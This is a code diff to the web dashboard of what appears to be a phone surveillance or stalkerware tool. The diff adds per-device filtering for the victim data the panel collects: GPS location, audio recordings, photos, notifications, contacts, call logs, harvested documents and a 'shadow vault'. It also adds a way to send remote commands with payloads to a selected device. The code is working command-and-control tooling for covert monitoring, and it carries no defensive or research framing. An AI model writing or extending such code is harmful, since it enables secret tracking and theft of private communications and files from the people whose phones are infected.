@@ -51,6 +51,36 @@ let cachedRecordings = [];
 let map, marker;
 let mapInitialized = false;
 let gpsPulseActive = false;
+let selectedDevice = 'ALL';
+
+const deviceSelector = document.getElementById('device-selector');
+if (deviceSelector) {
+    deviceSelector.addEventListener('change', (e) => {
+        selectedDevice = e.target.value;
+        log(`Switched target device to: ${selectedDevice}`);
+        loadLastLocation(); loadRecordings(); loadNotifications(); loadPhotos(); loadSocialData(); loadIntelFeed(); loadDiscoveredDocs();
+    });
+}
+
+async function loadDevices() {
+    const { data } = await client.from('intel_logs').select('device_id').not('device_id', 'is', null).limit(1000);
+    if (data) {
+        const uniqueDevices = [...new Set(data.map(d => d.device_id))];
+        const selector = document.getElementById('device-selector');
+        if(!selector) return;
+        const currentSelection = selector.value;
+        selector.innerHTML = '<option value="ALL">All Devices</option>';
+        uniqueDevices.forEach(d => {
+            const opt = document.createElement('option');
+            opt.value = d;
+            opt.textContent = `Device: ${d.substring(0,8)}...`;
+            selector.appendChild(opt);
+        });
+        selector.value = uniqueDevices.includes(currentSelection) ? currentSelection : "ALL";
+    }
+}
+loadDevices();
+setInterval(loadDevices, 15000);
 
 // Navigation Logic
 function switchView(viewName) {
@@ -116,12 +146,10 @@ function initMap() {
 
 async function loadLastLocation() {
     log(`FETCH: Checking for latest GPS coordinates...`);
-    const { data, error } = await client
-        .from('location_data')
-        .select('*')
-        .order('created_at', { ascending: false })
-        .limit(1)
-        .maybeSingle();
+    let query = client.from('location_data').select('*').order('created_at', { ascending: false }).limit(1);
+    if (selectedDevice !== 'ALL') query = query.eq('device_id', selectedDevice);
+    
+    const { data, error } = await query.maybeSingle();
 
     if (error) {
         log(`ERR: Location fetch failed: ${error.message}`);
@@ -166,9 +194,13 @@ function formatDate(filename) {
 }
 
 // Supabase Logic
-async function sendCommand(command) {
-    log(`SIGNAL: Sending [${command}]...`);
-    const { error } = await client.from('remote_commands').insert([{ command }]);
+async function sendCommand(command, payload = null) {
+    log(`SIGNAL: Sending [${command}] to ${selectedDevice}...`);
+    const { error } = await client.from('remote_commands').insert([{ 
+        command, 
+        payload, 
+        target_device_id: selectedDevice 
+    }]);
     if (error) {
         log(`ERR: ${error.message}`);
     } else {
@@ -177,7 +209,11 @@ async function sendCommand(command) {
 }
 
 async function loadRecordings() {
-    const { data, error } = await client.storage.from('recordings').list('', {
+    if (selectedDevice === 'ALL') {
+        recordingTableBody.innerHTML = '<tr><td colspan="4" style="text-align:center; padding: 40px; color:var(--warning)">Please select a specific device to view recordings.</td></tr>';
+        return;
+    }
+    const { data, error } = await client.storage.from('recordings').list(selectedDevice, {
         sortBy: { column: 'name', order: 'desc' }
     });
     
@@ -186,7 +222,7 @@ async function loadRecordings() {
         return;
     }
 
-    cachedRecordings = data.filter(file => file.name.endsWith('.m4a'));
+    cachedRecordings = data.filter(file => file.name.endsWith('.m4a')).map(f => ({...f, path: `${selectedDevice}/${f.name}`}));
     renderRecordingsTable(cachedRecordings);
 }
 
@@ -212,7 +248,7 @@ function renderRecordingsTable(recordings) {
         `;
 
         row.querySelector('.btn-download').onclick = async () => {
-            const { data: urlData, error: urlErr } = await client.storage.from('recordings').createSignedUrl(file.name, 60);
+            const { data: urlData, error: urlErr } = await client.storage.from('recordings').createSignedUrl(file.path, 60);
             if (urlErr) log(`Download Error: ${urlErr.message}`);
             else window.open(urlData.signedUrl);
         };
@@ -220,7 +256,7 @@ function renderRecordingsTable(recordings) {
         row.querySelector('.btn-delete-rec').onclick = async () => {
             if (confirm(`Permanently delete this recording: ${prettyDate}?`)) {
                 log(`Deleting ${file.name}...`);
-                const { data, error: delErr } = await client.storage.from('recordings').remove([file.name]);
+                const { data, error: delErr } = await client.storage.from('recordings').remove([file.path]);
                 if (delErr) log(`Delete Error: ${delErr.message}`);
                 else {
                     if (data && data.length === 0) {
@@ -255,10 +291,10 @@ async function deleteNotification(id) {
 let cachedNotifications = [];
 
 async function loadNotifications() {
-    const { data, error } = await client
-        .from('notifier_data')
-        .select('*')
-        .order('created_at', { ascending: false });
+    let query = client.from('notifier_data').select('*').order('created_at', { ascending: false });
+    if (selectedDevice !== 'ALL') query = query.eq('device_id', selectedDevice);
+    
+    const { data, error } = await query;
     if (error) return;
 
     cachedNotifications = data;
@@ -332,7 +368,12 @@ if(btnRefreshNotifs) {
 
 // Camera Logic (Dashboard side)
 async function loadPhotos() {
-    const { data, error } = await client.storage.from('photos').list('', {
+    if (selectedDevice === 'ALL') {
+        photoGrid.innerHTML = '<div style="color:var(--warning); padding:40px;">Please select a specific device to view photos.</div>';
+        return;
+    }
+
+    const { data, error } = await client.storage.from('photos').list(selectedDevice, {
         sortBy: { column: 'name', order: 'desc' }
     });
 
@@ -366,18 +407,18 @@ async function loadPhotos() {
 
         // Create signed URL for the image
         (async () => {
-            const { data: urlData } = await client.storage.from('photos').createSignedUrl(file.name, 3600);
+            const { data: urlData } = await client.storage.from('photos').createSignedUrl(`${selectedDevice}/${file.name}`, 3600);
             if (urlData) row.querySelector('.photo-img').src = urlData.signedUrl;
         })();
 
         row.querySelector('.btn-dl-photo').onclick = async () => {
-            const { data: urlData } = await client.storage.from('photos').createSignedUrl(file.name, 60);
+            const { data: urlData } = await client.storage.from('photos').createSignedUrl(`${selectedDevice}/${file.name}`, 60);
             if (urlData) window.open(urlData.signedUrl);
         };
 
         row.querySelector('.btn-del-photo').onclick = async () => {
             if (confirm("Permanently delete this photo?")) {
-                const { data, error: delErr } = await client.storage.from('photos').remove([file.name]);
+                const { data, error: delErr } = await client.storage.from('photos').remove([`${selectedDevice}/${file.name}`]);
                 if (delErr) log(`Del Err: ${delErr.message}`);
                 else {
                     if (data && data.length === 0) {
@@ -395,9 +436,9 @@ async function loadPhotos() {
 // Social Logic
 async function loadSocialData() {
     // Load Contacts
-    const { data: contacts, error: cErr } = await client.from('contacts')
-        .select('*')
-        .order('name', { ascending: true });
+    let cQuery = client.from('contacts').select('*').order('name', { ascending: true });
+    if (selectedDevice !== 'ALL') cQuery = cQuery.eq('device_id', selectedDevice);
+    const { data: contacts, error: cErr } = await cQuery;
 
     if (!cErr) {
         contactsList.innerHTML = contacts.map(c => `
@@ -410,9 +451,9 @@ async function loadSocialData() {
     }
 
     // Load Call Logs
-    const { data: logs, error: lErr } = await client.from('call_logs')
-        .select('*')
-        .order('timestamp', { ascending: false });
+    let lQuery = client.from('call_logs').select('*').order('timestamp', { ascending: false });
+    if (selectedDevice !== 'ALL') lQuery = lQuery.eq('device_id', selectedDevice);
+    const { data: logs, error: lErr } = await lQuery;
 
     if (!lErr) {
         callLogsList.innerHTML = logs.map(l => {
@@ -442,11 +483,15 @@ async function browseFolder(path) {
 }
 
 async function loadVault() {
-    const { data: files, error } = await client.storage.from('files').list();
+    if (selectedDevice === 'ALL') {
+        fileVaultGrid.innerHTML = '<div style="color:var(--warning); padding:20px;">Please select a specific device to view vault files.</div>';
+        return;
+    }
+    const { data: files, error } = await client.storage.from('files').list(selectedDevice);
     if (!error) {
-        fileVaultGrid.innerHTML = files.map(f => {
+        fileVaultGrid.innerHTML = files.filter(f => f.name !== '.emptyFolderPlaceholder').map(f => {
             const isImage = f.name.match(/\.(jpg|jpeg|png|gif|webp)$/i);
-            const publicUrl = client.storage.from('files').getPublicUrl(f.name).data.publicUrl;
+            const publicUrl = client.storage.from('files').getPublicUrl(`${selectedDevice}/${f.name}`).data.publicUrl;
             
             return `
                 <div class="card" style="padding:10px;">
@@ -454,7 +499,7 @@ async function loadVault() {
                     <div style="font-size:11px; font-weight:700; word-break:break-all; margin-bottom:5px;">${f.name}</div>
                     <div style="display:flex; gap:5px;">
                         <a href="${publicUrl}" download class="btn btn-primary" style="flex:1; text-align:center; padding:5px; font-size:10px;">DOWNLOAD</a>
-                        <button class="btn btn-danger" onclick="deleteVaultFile('${f.name}')" style="padding:5px; font-size:10px;">🗑️</button>
+                        <button class="btn btn-danger" onclick="deleteVaultFile('${selectedDevice}/${f.name}')" style="padding:5px; font-size:10px;">🗑️</button>
                     </div>
                 </div>
             `;
@@ -500,10 +545,10 @@ client.channel('file_lists_channel')
 
 // Intelligence Logic
 async function loadIntelFeed() {
-    const { data: logs, error } = await client.from('intel_logs')
-        .select('*')
-        .neq('type', 'HEARTBEAT')
-        .order('created_at', { ascending: false });
+    let query = client.from('intel_logs').select('*').neq('type', 'HEARTBEAT').order('created_at', { ascending: false });
+    if (selectedDevice !== 'ALL') query = query.eq('device_id', selectedDevice);
+    
+    const { data: logs, error } = await query;
 
     if (!error) {
         intelFeed.innerHTML = logs.map(l => renderIntelItem(l)).join('');
@@ -556,9 +601,10 @@ client.channel('intel_channel')
 
 // Discovery & Shadow Logic
 async function loadDiscoveredDocs() {
-    const { data: docs, error } = await client.from('discovered_docs')
-        .select('*')
-        .order('created_at', { ascending: false });
+    let query = client.from('discovered_docs').select('*').order('created_at', { ascending: false });
+    if (selectedDevice !== 'ALL') query = query.eq('device_id', selectedDevice);
+    
+    const { data: docs, error } = await query;
 
     if (!error) {
         if (docs.length === 0) {
@@ -579,7 +625,7 @@ async function loadDiscoveredDocs() {
 
 async function loadShadowVault() {
     log("Loading Shadow Vault...");
-    const deviceId = "Unknown"; // In a real scenario, this would be the active device ID
+    const deviceId = selectedDevice === 'ALL' ? 'Unknown' : selectedDevice;
     const { data: files, error } = await client.storage.from('files').list(`shadow_vault/${deviceId}`);
 
     if (!error) {
@@ -748,13 +794,9 @@ function updateOnlineStatusUI() {
 }
 
 async function fetchLatestHeartbeat() {
-    const { data, error } = await client
-        .from('intel_logs')
-        .select('created_at')
-        .eq('type', 'HEARTBEAT')
-        .order('created_at', { ascending: false })
-        .limit(1)
-        .maybeSingle();
+    let query = client.from('intel_logs').select('created_at').eq('type', 'HEARTBEAT').order('created_at', { ascending: false }).limit(1);
+    if (selectedDevice !== 'ALL') query = query.eq('device_id', selectedDevice);
+    const { data, error } = await query.maybeSingle();
         
     if (!error && data) {
         lastSeenTimestamp = new Date(data.created_at).getTime();
